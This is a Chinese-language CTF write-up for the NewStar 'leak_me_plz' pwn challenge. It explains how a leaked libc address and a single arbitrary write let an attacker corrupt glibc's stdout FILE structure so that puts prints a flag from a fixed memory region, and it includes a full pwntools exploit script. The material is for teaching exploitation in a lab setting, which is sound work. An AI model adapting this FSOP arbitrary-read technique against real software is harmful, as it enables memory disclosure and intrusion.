---
title: leak_me_plz
date: 2023-03-19 19:15:21
categories: 
- pwn_wp
tags: 
- pwn
- IO_FILE

---

NewStar CTF Week5的题，利用stdout进行任意读。这题主要是想让一些同学了解打 Stdout 不只局限在低字节写 `\x00` 来 leak libc，有时候我们可以利用这个来 leak `environ`拿栈地址打栈，leak `fskey` 打 `_IO_cookie_write`(House of Emma) ...

<!--more-->

查壳，保护全开

```sh
[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/leak_me_plz/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

开了沙箱

```sh
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x06 0x00 0x40000000  if (A >= 0x40000000) goto 0010
 0004: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0009
 0005: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0009
 0006: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0009
 0007: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0009
 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL

```

不能`execve`而且`orw`缺`w`。

程序比较简单。

在init函数中进行初始化并在0x233000的位置分配了一块大小为`0x1000`的RW的内存，并且在get_flag中已经将flag写入到其中了，只需要将其读出即可知道flag。

漏洞在vuln函数中

```c
void __noreturn vuln()
{
  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[1] = (void *)__readfsqword(0x28u);
  buf[0] = 0LL;
  puts("Hiiii!My beeest friend.So glad that you come again.This time you need to read the flag.");
  printf("Here is your gift: %p\nGood luck!\n", &puts);
  printf("Addr: ");
  read(0, buf, 8uLL);
  printf("Data: ");
  read(0, buf[0], 0x38uLL);
  puts("Did you get that?");
  _exit(0);
}
```

开始会泄露出puts的地址，可以得到libcbase，之后会有一次任意写0x38byte的机会。

在read后面有一个puts语句，可以尝试修改`_IO_2_1_stdout_`的`flag`、`write_base`和`write_ptr`实现任意读来将`flag`输出出来，还要设置`write_ptr==write_end`来避免在全缓冲模式下计算的count>0(详情看源码，明明puts是以行缓冲模式计算的，不知道为何不设置的话无法输出)。

exp:

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)
libc=ELF('./libc-2.31.so')
p=process('./'+filename)
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    

ru("Here is your gift: ")
libcbase=int(ru('\n')[2:-1],16)-libc.sym['puts']
ru('Good luck!\n')

stdout=libcbase+libc.sym['_IO_2_1_stdout_']

ru("Addr: ")
payload=p64(stdout)

leak('libcbase: ',hex(libcbase))
leak('stdout: ',hex(stdout))
debug()
s(payload)  

ru("Data: ")
payload=p64(0xfbad1800)+p64(0)*3+p64(0x233000)+p64(0x233040)+p64(0x233040)

s(payload)

itr()
```

